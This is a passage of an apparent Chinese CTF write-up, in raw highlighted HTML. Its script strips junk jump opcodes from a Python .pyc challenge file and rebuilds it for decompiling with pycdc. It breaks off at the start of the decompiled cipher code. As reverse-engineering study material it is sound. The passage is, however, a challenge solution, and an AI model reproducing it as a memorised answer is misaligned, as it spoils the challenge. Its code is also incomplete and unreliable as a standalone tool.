code.co_posonlyargcount,</span><br><span class="line">                          code.co_kwonlyargcount,</span><br><span class="line">                          code.co_nlocals,</span><br><span class="line">                          code.co_stacksize,</span><br><span class="line">                          code.co_flags,</span><br><span class="line">                          <span class="hljs-built_in">bytes</span>(co),</span><br><span class="line">                          <span class="hljs-built_in">tuple</span>(code.co_consts),</span><br><span class="line">                          code.co_names,</span><br><span class="line">                          code.co_varnames,</span><br><span class="line">                          code.co_filename,</span><br><span class="line">                          code.co_name,</span><br><span class="line">                          code.co_firstlineno,</span><br><span class="line">                          code.co_lnotab,</span><br><span class="line">                          code.co_freevars,</span><br><span class="line">                          code.co_cellvars)</span><br><span class="line">    dis.disassemble(mode)</span><br><span class="line">    <span class="hljs-comment"># print("=====")</span></span><br><span class="line">    <span class="hljs-comment"># dis.disassemble(code)</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sconsts"</span> % indent)</span><br><span class="line">    <span class="hljs-keyword">for</span> const <span class="hljs-keyword">in</span> code.co_consts:</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(const) == types.CodeType:</span><br><span class="line">            show_code(const, indent+<span class="hljs-string">'   '</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">"   %s%r"</span> % (indent, const))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%snames %r"</span> % (indent, code.co_names))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%svarnames %r"</span> % (indent, code.co_varnames))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sfreevars %r"</span> % (indent, code.co_freevars))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%scellvars %r"</span> % (indent, code.co_cellvars))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sfilename %r"</span> % (indent, code.co_filename))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sname %r"</span> % (indent, code.co_name))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sfirstlineno %d"</span> % (indent, code.co_firstlineno))</span><br><span class="line">    show_hex(<span class="hljs-string">"lnotab"</span>, code.co_lnotab, indent=indent)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_hex</span>(<span class="hljs-params">label, h, indent</span>):</span></span><br><span class="line">    h = binascii.hexlify(h)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) &lt; <span class="hljs-number">60</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"%s%s %s"</span> % (indent, label, h))</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"%s%s"</span> % (indent, label))</span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(h), <span class="hljs-number">60</span>):</span><br><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">"%s   %s"</span> % (indent, h[i:i+<span class="hljs-number">60</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de</span>(<span class="hljs-params">code</span>):</span></span><br><span class="line">    co = <span class="hljs-built_in">bytearray</span>(code.co_code)</span><br><span class="line">    extended_arg = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(co), <span class="hljs-number">2</span>):</span><br><span class="line">        op = co[i]</span><br><span class="line">        <span class="hljs-keyword">if</span> op &gt;= <span class="hljs-number">90</span>:</span><br><span class="line">            arg = co[i+<span class="hljs-number">1</span>] | extended_arg</span><br><span class="line">            extended_arg = (arg &lt;&lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">if</span> op == <span class="hljs-number">114</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span></span><br><span class="line">            <span class="hljs-keyword">if</span> co[i] == <span class="hljs-number">110</span>:</span><br><span class="line">                <span class="hljs-comment"># print("=========&gt; ", co[i+1])</span></span><br><span class="line">                <span class="hljs-keyword">if</span> arg &lt; <span class="hljs-number">10</span>:</span><br><span class="line">                    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, i+arg+<span class="hljs-number">2</span>):</span><br><span class="line">                        co[j] = <span class="hljs-number">9</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            arg = <span class="hljs-literal">None</span></span><br><span class="line">            extended_arg = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-comment"># mode=types.CodeType(code.co_argcount,code.co_posonlyargcount,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_kwonlyargcount,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_nlocals,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_stacksize,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_flags,</span></span><br><span class="line">    <span class="hljs-comment"># bytes(co),</span></span><br><span class="line">    <span class="hljs-comment"># tuple(code.co_consts),</span></span><br><span class="line">    <span class="hljs-comment"># code.co_names,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_varnames,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_filename,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_name,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_firstlineno,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_lnotab,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_freevars,</span></span><br><span class="line">    <span class="hljs-comment"># code.co_cellvars)</span></span><br><span class="line">    <span class="hljs-comment"># dis.disassemble(mode)</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(co)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    filename = <span class="hljs-string">"./RightBack.pyc"</span></span><br><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">        header = f.read(<span class="hljs-number">16</span>)</span><br><span class="line">        code = marshal.load(f)</span><br><span class="line">    consts = <span class="hljs-built_in">list</span>()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code.co_consts)):</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(code.co_consts[i], <span class="hljs-string">'co_code'</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> code.co_name==<span class="hljs-string">'VM'</span>:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            consts.append(types.CodeType(code.co_consts[i].co_argcount,</span><br><span class="line">                                         code.co_posonlyargcount,</span><br><span class="line">                                         code.co_kwonlyargcount,</span><br><span class="line">                                         code.co_consts[i].co_nlocals,</span><br><span class="line">                                         code.co_consts[i].co_stacksize,</span><br><span class="line">                                         code.co_consts[i].co_flags,</span><br><span class="line">                                         de(code.co_consts[i]),</span><br><span class="line">                                         code.co_consts[i].co_consts,</span><br><span class="line">                                         code.co_consts[i].co_names,</span><br><span class="line">                                         code.co_consts[i].co_varnames,</span><br><span class="line">                                         code.co_consts[i].co_filename,</span><br><span class="line">                                         code.co_consts[i].co_name,</span><br><span class="line">                                         code.co_consts[i].co_firstlineno,</span><br><span class="line">                                         <span class="hljs-comment"># In general, You should adjust this</span></span><br><span class="line">                                         code.co_consts[i].co_lnotab,</span><br><span class="line">                                         code.co_consts[i].co_freevars,</span><br><span class="line">                                         code.co_consts[i].co_cellvars))</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            consts.append(code.co_consts[i])</span><br><span class="line"></span><br><span class="line">    mode = types.CodeType(code.co_argcount,</span><br><span class="line">                          code.co_posonlyargcount,</span><br><span class="line">                          code.co_kwonlyargcount,</span><br><span class="line">                          code.co_nlocals,</span><br><span class="line">                          code.co_stacksize,</span><br><span class="line">                          code.co_flags,</span><br><span class="line">                          de(code),</span><br><span class="line">                          <span class="hljs-built_in">tuple</span>(consts),</span><br><span class="line">                          code.co_names,</span><br><span class="line">                          code.co_varnames,</span><br><span class="line">                          code.co_filename,</span><br><span class="line">                          code.co_name,</span><br><span class="line">                          code.co_firstlineno,</span><br><span class="line">                          code.co_lnotab,   <span class="hljs-comment"># In general, You should adjust this</span></span><br><span class="line">                          code.co_freevars,</span><br><span class="line">                          code.co_cellvars)</span><br><span class="line"></span><br><span class="line">    f = <span class="hljs-built_in">open</span>(filename+<span class="hljs-string">".mod"</span>, <span class="hljs-string">'wb'</span>)</span><br><span class="line">    f.write(header)</span><br><span class="line">    marshal.dump(mode, f)</span><br><span class="line">    <span class="hljs-comment"># with open(filename, "rb") as fp:</span></span><br><span class="line">    <span class="hljs-comment">#     print_metadata(fp)</span></span><br><span class="line">    <span class="hljs-comment">#     code_object = marshal.load(fp)</span></span><br><span class="line">    <span class="hljs-comment">#     show_code(code_object)</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>用pycdc可以得到py文件，稍微修正以后输出执行指令</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="hljs-comment"># File: RightBack.pyc.mod (Python 3.9)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T</span>(<span class="hljs-params">num, <span class="hljs-built_in">round</span></span>):</span></span><br><span class="line">    numArr = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">'&lt;I'</span>, num))</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):</span><br><span class="line">        numArr[i] = Sbox[numArr[i]]</span><br><span class="line">    <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">'&lt;I'</span>, numArr)[<span class="hljs-number">0</span>] ^ Rcon[<span class="hljs-built_in">round</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p1</span>(<span class="hljs-params">s, key</span>):</span></span><br><span class="line">    j = <span class="hljs-number">0</span></span><br><span 